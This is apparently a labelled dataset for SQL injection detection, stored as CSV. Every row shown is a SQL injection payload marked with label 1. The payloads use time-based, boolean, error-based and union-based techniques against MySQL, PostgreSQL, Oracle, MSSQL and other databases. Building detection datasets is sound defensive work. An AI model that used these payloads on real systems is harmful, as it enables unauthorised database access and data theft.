Sentence,Label
-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
-2648'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'sawt'  =  'sawt,1
select   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  select 2140 from information_schema.character_sets  )   end  )  #,1
select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #,1
"-9140""   )    )    union all select 162316231623162316231623162316231623#",1
"-1597"" union all select 6038603860386038603860386038603860386038--",1
-4669  )   or 2452  =  1601#,1
1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,1
"-7122""  )   union all select 40024002400240024002400240024002#",1
"-3460%""   )    )     )   or 9323  =  9323#",1
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,1
1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1"" or 8466  =  benchmark  (  5000000md5  (  0x694a4745   )    )   ",1
1'+  (  select eluw where 6210  =  6210,1
1  )   or updatexml  (  1808concat  (  0x2e0x7171706a71  (  select   (  elt  (  1808  =  18081   )    )     )  0x717a767a71  )  8666  )  ,1
-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 733673367336--,1
1'   )    )    as egsj where 3447  =  3447,1
"1""  )   as ssbz where 8885  =  8885 union all select nullnullnullnullnullnullnullnullnull--",1
-6298' or 4724  =  4876,1
"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",1
-1802' or 7931  =  5841--,1
select like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng,1
1 union all select nullnullnullnullnull#,1
1'  (  select   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  select 1902 from master..sysdatabases  )   end   )    )   ,1
"-1390%""   )    )    union all select 89308930893089308930#",1
1 where 1992  =  1992 union all select nullnull--,1
"1"" and 5205  =  9975#",1
1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  ,1
-4057'  )   order by 1#,1
-8929%'  )   union all select 9486948694869486#,1
-3462   )    )    as biyl where 5143  =  5143 union all select 514351435143--,1
"-2570"" or 1570  =  convert  (  int  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dmch"" like ""dmch",1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   and    (    (   3127  =  3127,1
-6218'   )    )    or 2236  =  4469#,1
"select benchmark  (  5000000md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",1
-2071 union all select 47534753--,1
select benchmark  (  5000000md5  (  0x4c4d6142   )    )   -- sztf,1
1' or 5286  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )   and 'aezm' like 'aezm,1
"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )  --",1
1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
-1076 union all select 39593959--,1
1'   )    )     )   or 8466  =  benchmark  (  5000000md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo,1
1   )    )    union all select nullnullnullnull#,1
1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#,1
-8772%' union all select 490949094909490949094909490949094909#,1
"-8043%""   )    )     )   or make_set  (  9354  =  93547185  )   and    (    (     (  ""%""  =  """,1
-6122'   )    )     )   or 9243  =  6161--,1
-9725  )   where 9068  =  9068 or elt  (  4723  =  14261426  )  --,1
"1%""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --",1
1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
1'+  (  select 'mxlb' where 4900  =  4900,1
1   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )    and    (    (     (  1729  =  1729,1
"1%""  )   or 8514  =  benchmark  (  5000000md5  (  0x544d5a4c   )    )   #",1
"1"" where 2452  =  2452",1
"select sleep  (  5  )   and   (  ""innk""  =  ""innk",1
1' or updatexml  (  1808concat  (  0x2e0x7171706a71  (  select   (  elt  (  1808  =  18081   )    )     )  0x717a767a71  )  8666  )   and 'nhmz' like 'nhmz,1
-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"-7601""   )    )     )   union all select 12931293129312931293129312931293--",1
1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9067  =  90671   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok,1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null   )    )   ||',1
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,1
-4838'   )    )    or 1 group by concat  (  0x7171706a71  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   0x717a767a71floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #,1
1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  --,1
1'   )    )     )   and sleep  (  5  )  #,1
"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,1
1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  29082908  )  --,1
"-9353"" where 4607  =  4607 union all select 460746074607460746074607#",1
1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  #,1
1   )    )    as amyr where 7875  =  7875 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  0  )  5000000000  )  null  )  --,1
1%'   )    )    or 8384  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  ',1
-4236  )   union all select 526052605260526052605260526052605260#,1
1   )    )     )   union all select nullnullnullnullnullnullnull#,1
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  15000000   )    )    and ""ncym"" like ""ncym",1
-7175' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'upzo'  =  'upzo,1
-6423'  )   or 6872  =  6872,1
1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   and   (  'ozef'  =  'ozef,1
"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
"1""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )   and    (    (     (  ""wvlb"" like ""wvlb",1
-4045 union all select 6857685768576857685768576857--,1
1'+  (  select oqvo where 7448  =  7448 union all select nullnullnullnullnull--,1
-3084%'   )    )    order by 1--,1
1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   and 'adsh'  =  'adsh,1
1   )    )    procedure analyse  (  extractvalue  (  9255concat  (  0x5c  (  benchmark  (  5000000md5  (  0x52515a50   )    )      )    )     )  1  )   and    (    (   4348  =  4348,1
1'   )    )    as iuta where 1482  =  1482,1
"1""   )    )     )   waitfor delay '0:0:5'--",1
1  )   and 3202  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ,1
1' in boolean mode  )   or updatexml  (  1808concat  (  0x2e0x7171706a71  (  select   (  elt  (  1808  =  18081   )    )     )  0x717a767a71  )  8666  )  #,1
1 or elt  (  5873  =  5873sleep  (  5   )    )   #,1
1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )  --,1
1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )   and   (  'gcna'  =  'gcna,1
1'   )    )    order by 1#,1
" end and    (    (     (  ""zpii"" like ""zpii",1
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,1
select   (  case when   (  5970  =  2200  )   then 1 else 5970*  (  select 5970 from master..sysdatabases  )   end  )  --,1
-4756%'   )    )    union all select 78247824782478247824782478247824#,1
"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
"1%""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  --",1
1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )   and   (  'iqvg'  =  'iqvg,1
"1%""  )   or elt  (  5873  =  5873sleep  (  5   )    )   #",1
1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  6270  =  62701   )    )     )  0x717a767a710x78   )    )   x   )    )   ,1
iif  (  1539  =  153915391/0  )  ,1
1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )   and    (    (     (  8738  =  8738,1
1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,1
1'||  (  select 'feki' where 4082  =  4082 and   (  3587  =  4207  )  *4207  )  ||',1
"1""  )   as jiiq where 6847  =  6847",1
select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3 and    (    (   'wusq'  =  'wusq,1
"1%""  )   order by 1#",1
"1""  )   as zopq where 2680  =  2680",1
"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   0x717a767a71floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )   and   (  4666  =  4666,1
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,1
-4222'  )   union all select 926792679267926792679267--,1
-2375 union all select 1573157315731573#,1
1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  --,1
1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
"-6803""  )   order by 1#",1
select * from generate_series  (  97099709case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--,1
"-7409""   )    )    union all select 314531453145--",1
"-4926"" where 8152  =  8152 or 4339  =  5547#",1
select case when 7951  =  1147 then 1 else null end--,1
" select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",1
1 union all select nullnullnull#,1
"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""frgb"" like ""frgb",1
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --",1
1'   )    )    as qqvk where 1007  =  1007,1
  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  6130  =  61301   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )  ,1
-2050' union all select 5606#,1
-7199' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'qibr'  =  'qibr,1
"-2256""   )    )     )   or 1971  =  4537#",1
"1%""   )    )    or 8514  =  benchmark  (  5000000md5  (  0x544d5a4c   )    )   #",1
1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840concat  (  0x5c0x7171706a71  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   0x717a767a71   )    )   1  )  --,1
1' where 2673  =  2673,1
"1""  )   where 2602  =  2602 and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --",1
1' and row  (  62377469  )  >  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  6237  =  62371   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ,1
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",1
1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  ,1
"-5014""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dkyp"" like ""dkyp",1
1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,1
make_set  (  7729  =  77291  )  ,1
"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,1
-9622'   )    )     )   order by 1#,1
1'+  (  select 'bmit' where 3716  =  3716 and row  (  62377469  )  >  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  6237  =  62371   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +',1
